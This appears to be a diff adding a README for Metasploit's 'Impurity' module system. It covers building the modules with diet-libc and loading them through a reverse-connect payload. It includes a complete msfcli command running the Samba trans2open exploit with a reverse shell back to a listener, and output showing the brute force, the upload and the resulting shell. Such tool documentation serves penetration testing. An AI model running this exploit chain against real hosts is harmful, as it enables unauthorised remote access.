@@ -1,0 +1,33 @@
+This directory contains all of the files necessary to develop Impurity
+modules for use with the metasploit framework.
+
+This system currently supports Linux on the x86 architecture and
+relies on diet-libc and a special linker script to compile the
+modules.
+
+To get started, install the diet-libc package and ensure that the
+"diet" wrapper command is in your path. At that point, you should be
+able to type "make" in this directory to compile the tracepath and
+shelldemo samples.
+
+To use an Impurity module, you must specify an Impurity-enabled
+payload (linx86reverse_imp) and use the PEXEC option to specify the
+path to your particular module. The NASM source code for the linux x86
+reverse-connect payload is included in this directory for reference.
+
+For example, to use the "shelldemo" module with the Samba trans2open
+exploit, you would use a command line like the following:
+
+
+$ ./msfcli 0x09 rhost=192.168.0.1 rport=139 lhost=192.168.0.247 \
+lport=34234 payload=linx86reverse_imp pexec=./impurity/shelldemo E
+[*] Starting handler impurity_reverse
+[*] Starting brute force mode...
+[*] Trying return address 0xbfffffdc
+[*] Trying return address 0xbfffebdc
+[*] Connection from 192.168.0.1:54990...
+[*] Uploading 14844 bytes... Done
+[*] Switching to impurity payload
+
+--=[ Impurity Demo Shell
+impurity demo > 
